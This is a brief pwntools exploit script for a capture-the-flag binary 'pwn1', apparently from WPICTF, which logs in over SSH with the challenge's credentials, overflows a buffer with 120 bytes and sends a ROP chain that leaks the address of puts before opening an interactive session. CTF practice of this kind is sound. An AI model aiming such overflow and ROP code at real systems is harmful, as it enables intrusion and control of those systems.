#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn1')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return ssh(host='source.wpictf.xyz',
                port=31337,
                user='source',
                password='sourcelocker')

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

rop=ROP(exe, badchars='\n')
rop.puts(exe.got['puts'])
rop.main()
print (rop.dump())

context.terminal=['tmux','split','-h']
io = start()
io.recv(timeout=0.1)
io.sendline('A'*120+rop.chain())
addr=u64(io.recvline().strip()+"\x00"*2)
log.info(hex(addr))

io.interactive()

